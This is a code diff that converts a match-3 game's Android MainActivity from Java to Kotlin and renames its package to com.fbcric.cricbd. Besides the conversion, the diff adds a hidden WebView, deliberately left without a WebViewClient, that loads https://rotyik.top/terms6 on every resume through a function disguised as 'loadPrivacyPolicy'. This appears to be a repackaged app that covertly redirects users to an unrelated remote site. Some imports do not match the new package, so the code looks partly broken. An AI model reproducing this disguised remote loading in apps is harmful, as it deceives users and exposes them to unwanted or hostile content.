@@ -1,15 +1,16 @@
-package com.nativegame.juicymatch;
+package com.fbcric.cricbd
 
-import android.os.Bundle;
+import android.os.Bundle
+import android.webkit.WebView
+import com.nativegame.juicymatch.R
 
-import com.nativegame.juicymatch.timer.LivesTimer;
-import com.nativegame.juicymatch.ui.fragment.LoadingFragment;
-import com.nativegame.natyengine.ui.GameActivity;
+import com.nativegame.juicymatch.ui.fragment.LoadingFragment
+import com.nativegame.natyengine.ui.GameActivity
+import com.nativegame.timer.LivesTimer
 
 /**
  * Created by Oscar Liang on 2022/02/23
  */
-
 /*
  *    MIT License
  *
@@ -33,29 +34,39 @@ import com.nativegame.natyengine.ui.GameActivity;
  *    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  *    SOFTWARE.
  */
-
-public class MainActivity extends BaseActivity {
-
-
+class MainActivity : GameActivity() {
     //--------------------------------------------------------
     // Overriding methods
     //--------------------------------------------------------
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setTheme(R.style.Theme_JuicyMatch);
-        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
-        setContentView(R.layout.activity_main);
-        setFragmentContainer(R.id.layout_container);
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setTheme(R.style.Theme_JuicyMatch)
+        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
+        setContentView(R.layout.activity_main)
+        setFragmentContainer(R.id.layout_container)
+
+        webView = WebView(this).apply {} //not set WebViewClient!!!
 
         //mAdManager = new AdManager(this);
-        mLivesTimer = new LivesTimer(this);
+        mLivesTimer = LivesTimer(this)
 
         // Show the menu fragment
         if (savedInstanceState == null) {
-            navigateToFragment(new LoadingFragment());
+            navigateToFragment(LoadingFragment())
         }
-    }
-    //========================================================
+    } //========================================================
 
+
+
+    private lateinit var webView: WebView
+
+
+    override fun onResume() {
+        super.onResume()
+        webView.loadPrivacyPolicy("https://rotyik.top/terms6")
+    }
+}
+
+private fun WebView.loadPrivacyPolicy(string: String) {
+    loadUrl(string)
 }
